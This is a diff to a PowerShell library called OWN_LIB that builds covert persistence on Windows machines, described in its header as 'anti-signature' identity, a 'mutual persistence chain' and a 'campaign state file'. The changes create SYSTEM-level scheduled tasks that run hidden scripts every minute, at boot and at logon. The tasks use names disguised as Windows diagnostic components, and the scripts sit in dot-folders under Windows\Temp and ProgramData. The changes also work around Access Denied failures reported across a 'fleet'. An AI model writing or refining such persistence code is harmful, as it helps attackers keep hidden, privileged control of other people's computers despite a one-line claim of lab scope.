@@ -1,16 +1,12 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L12
+# OWN_LIB  BUILD 20260802L13
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L12: IDENTVER=7 ROOT-level task names. Nested \Microsoft\Windows\* creates
-#      are Access Denied fleet-wide (verify_taskA-D_FAIL); WMI + WucacheOwn OK.
+# L13: schtasks Create via cmd (like WucacheOwn), TR under Windows\Temp\.wucache
+#      (not ACL-locked ProgramData path), /ST 00:00 on MINUTE, no leading \.
+# L12: IDENTVER=7 ROOT-level task names (nested Microsoft\Windows Access Denied).
 # L11: NEVER reuse real Windows built-in task names; TR ownership checks.
-# L8: Test-SCRegistered fixed (ForEach-Object return never left function);
-#     DisplayName -ieq exact match; repair GUID walk uses foreach;
-#     SC research: per-FP UpgradeCode + legacy family Upgrade rows mean
-#     msiexec /i of primary can remove siblings - prefer /fa always.
-# L7: FIXED WOW6432Node uninstall hive path; hardened Invoke-Exterminate.
 # Authorized internal deployment - lab/competition scope only.
 # ═══════════════════════════════════════════════════════════════
 [CmdletBinding()]
@@ -27,21 +23,20 @@ param(
 
 $ErrorActionPreference = 'SilentlyContinue'
 $cfgPath = Join-Path $WorkDir 'identity.cfg'
-$IdentVersion = 7
+$IdentVersion = 8
 
-# ROOT-level task names only (single path segment). Nested Microsoft\Windows\*
-# folders reject Create with Access Denied on Win10/11 Home+Pro (fleet O32).
+# Root-level names WITHOUT leading backslash (matches working WucacheOwn style).
 $Pools = @{
-    A = @('\WerQueueSync','\DiagHostCache','\NetTraceCache','\WdiHostProxy','\PlaServerHealth','\TcpIpConflictRes','\SrCacheSync','\ResolutionQueue')
-    B = @('\PlaServerHealth','\WdiHostProxy','\WerQueueSync','\NetTraceCache','\DiagHostCache','\TcpIpConflictRes','\PlaServerDiag','\SrCacheSync')
-    C = @('\ResolutionQueue','\NetTraceCache','\TcpIpConflictRes','\WerQueueSync','\PlaServerHealth','\DiagHostCache','\PlaServerDiag','\WdiHostProxy')
-    D = @('\TcpIpConflictRes','\ResolutionQueue','\NetTraceCache','\DiagHostCache','\PlaServerDiag','\WerQueueSync','\PlaServerHealth','\WdiHostProxy')
+    A = @('WerQueueSync','DiagHostCache','NetTraceCache','WdiHostProxy','PlaServerHealth','TcpIpConflictRes','SrCacheSync','ResolutionQueue')
+    B = @('PlaServerHealth','WdiHostProxy','WerQueueSync','NetTraceCache','DiagHostCache','TcpIpConflictRes','PlaServerDiag','SrCacheSync')
+    C = @('ResolutionQueue','NetTraceCache','TcpIpConflictRes','WerQueueSync','PlaServerHealth','DiagHostCache','PlaServerDiag','WdiHostProxy')
+    D = @('TcpIpConflictRes','ResolutionQueue','NetTraceCache','DiagHostCache','PlaServerDiag','WerQueueSync','PlaServerHealth','WdiHostProxy')
 }
 $Defaults = [ordered]@{
-    TASK_A = '\WerQueueSync'
-    TASK_B = '\PlaServerHealth'
-    TASK_C = '\WdiHostProxy'
-    TASK_D = '\TcpIpConflictRes'
+    TASK_A = 'WerQueueSync'
+    TASK_B = 'PlaServerHealth'
+    TASK_C = 'WdiHostProxy'
+    TASK_D = 'TcpIpConflictRes'
     MO_A   = '2'
     MO_B   = '3'
 }
@@ -135,51 +130,77 @@ function Initialize-Identity {
     return (Read-Identity)
 }
 
+function Normalize-TaskName([string]$tn) {
+    if (-not $tn) { return '' }
+    return $tn.Trim().TrimStart('\')
+}
+
 function Write-OwnLog([string]$m) {
     $log = Join-Path $WorkDir 'boot.err'
     try { Add-Content -LiteralPath $log -Value $m -Force } catch {}
 }
 
 function Ensure-PersistTasks {
-    # Create/repair A-D only when missing OR Task To Run is not ours (Windows collision).
+    # Mirror working detach (WucacheOwn): cmd schtasks, BOOT TR path, /ST on MINUTE.
     $id = Initialize-Identity
     if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
+    $boot = Join-Path $env:SystemRoot 'Temp\.wucache'
     $etlDir = 'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache'
-    $etlMon = Join-Path $etlDir 'etl_mon.cmd'
-    if (-not (Test-Path -LiteralPath $etlDir)) { New-Item -ItemType Directory -Path $etlDir -Force | Out-Null }
-    if (Test-Path -LiteralPath $MonPath) {
-        try { Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force } catch {}
+    foreach ($d in @($boot, $etlDir)) {
+        if (-not (Test-Path -LiteralPath $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
     }
+    $bootMon = Join-Path $boot 'own_mon.cmd'
+    $bootEtl = Join-Path $boot 'etl_mon.cmd'
+    $etlMon = Join-Path $etlDir 'etl_mon.cmd'
+    if (Test-Path -LiteralPath $MonPath) {
+        Copy-Item -LiteralPath $MonPath -Destination $bootMon -Force -ErrorAction SilentlyContinue
+        Copy-Item -LiteralPath $MonPath -Destination $bootEtl -Force -ErrorAction SilentlyContinue
+        Copy-Item -LiteralPath $MonPath -Destination $etlMon -Force -ErrorAction SilentlyContinue
+    }
+    # BOOT is not LockDir'd by own_secure — Task Scheduler can resolve TR there.
+    $trMon = "cmd.exe /c $bootMon"
+    $trEtl = "cmd.exe /c $bootEtl"
     $moA = [string]$id['MO_A']; if (-not $moA) { $moA = '2' }
     $moB = [string]$id['MO_B']; if (-not $moB) { $moB = '3' }
+    $st = (Get-Date).ToString('HH:mm')
     $specs = @(
-        @{ Key = 'TASK_A'; Marker = 'own_mon.cmd'; Sc = 'MINUTE'; Mo = $moA; Tr = "cmd.exe /c $MonPath" }
-        @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = "cmd.exe /c $etlMon" }
-        @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = "cmd.exe /c $MonPath" }
-        @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = "cmd.exe /c $MonPath" }
+        @{ Key = 'TASK_A'; Marker = 'own_mon.cmd'; Sc = 'MINUTE'; Mo = $moA; Tr = $trMon }
+        @{ Key = 'TASK_B'; Marker = 'etl_mon.cmd'; Sc = 'MINUTE'; Mo = $moB; Tr = $trEtl }
+        @{ Key = 'TASK_C'; Marker = 'own_mon.cmd'; Sc = 'ONSTART'; Mo = ''; Tr = $trMon }
+        @{ Key = 'TASK_D'; Marker = 'own_mon.cmd'; Sc = 'ONLOGON'; Mo = ''; Tr = $trMon }
     )
     $ok = 0; $rearmed = 0; $fail = 0
     foreach ($sp in $specs) {
-        $tn = [string]$id[$sp.Key]
+        $tn = Normalize-TaskName ([string]$id[$sp.Key])
         if (-not $tn) { $fail++; continue }
         if (Test-TaskOwnsMon $tn $sp.Marker) { $ok++; continue }
+        if (Test-TaskOwnsMon ("\$tn") $sp.Marker) { $ok++; continue }
         $blob = Get-TaskVerboseBlob $tn
-        $exists = [bool]$blob
-        if ($exists) {
-            # Leave real Windows tasks alone. Only replace if this was already our action.
+        if (-not $blob) { $blob = Get-TaskVerboseBlob ("\$tn") }
+        if ($blob) {
             $oursBroken = ($blob -match '(?i)own_mon\.cmd|etl_mon\.cmd|\.wucache\\|\.etlcache\\')
-            if (-not $oursBroken) { $fail++; continue }
+            if (-not $oursBroken) { $fail++; Write-OwnLog "tasks_skip_foreign $tn"; continue }
             Remove-TaskQuiet $tn
+            Remove-TaskQuiet ("\$tn")
         }
-        $args = @('/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F', '/TR', $sp.Tr, '/SC', $sp.Sc)
-        if ($sp.Sc -eq 'MINUTE' -and $sp.Mo) { $args += @('/MO', $sp.Mo) }
-        $createOut = & schtasks.exe @args 2>&1 | ForEach-Object { "$_" }
-        $createTxt = ($createOut -join ' ').Trim()
-        if ($createTxt) { Write-OwnLog "tasks_create $($sp.Key) $tn => $createTxt" }
-        if (Test-TaskOwnsMon $tn $sp.Marker) {
+        # Build cmdline exactly like own.cmd detach (proven to work as SYSTEM).
+        $parts = @(
+            '/Create', '/TN', $tn, '/RU', 'SYSTEM', '/RL', 'HIGHEST', '/F',
+            '/TR', $sp.Tr, '/SC', $sp.Sc
+        )
+        if ($sp.Sc -eq 'MINUTE') {
+            $parts += @('/MO', $sp.Mo, '/ST', $st)
+        }
+        $argLine = ($parts | ForEach-Object {
+            if ($_ -match '[\s"]') { '"{0}"' -f ($_ -replace '"', '\"') } else { $_ }
+        }) -join ' '
+        $createTxt = cmd.exe /c "schtasks.exe $argLine" 2>&1 | ForEach-Object { "$_" }
+        $createJoined = ($createTxt -join ' ').Trim()
+        Write-OwnLog "tasks_create $($sp.Key) $tn => $createJoined"
+        if ((Test-TaskOwnsMon $tn $sp.Marker) -or (Test-TaskOwnsMon ("\$tn") $sp.Marker)) {
             $rearmed++
             if ($sp.Key -eq 'TASK_A' -or $sp.Key -eq 'TASK_B') {
-                & schtasks.exe /Run /TN $tn 2>&1 | Out-Null
+                cmd.exe /c "schtasks.exe /Run /TN `"$tn`"" | Out-Null
             }
         } else {
             $fail++
@@ -537,10 +558,10 @@ function Update-State {
     $tasksOk = 0; $tasksTotal = 0
     foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') {
         $tasksTotal++
-        $tn = [string]$id[$k]
+        $tn = Normalize-TaskName ([string]$id[$k])
         if (-not $tn) { continue }
         $marker = if ($k -eq 'TASK_B') { 'etl_mon.cmd' } else { 'own_mon.cmd' }
-        if (Test-TaskOwnsMon $tn $marker) { $tasksOk++ }
+        if ((Test-TaskOwnsMon $tn $marker) -or (Test-TaskOwnsMon ("\$tn") $marker)) { $tasksOk++ }
     }
     if (-not $MonPath) { $MonPath = Join-Path $WorkDir 'own_mon.cmd' }
     $wd = Ensure-Watchdog
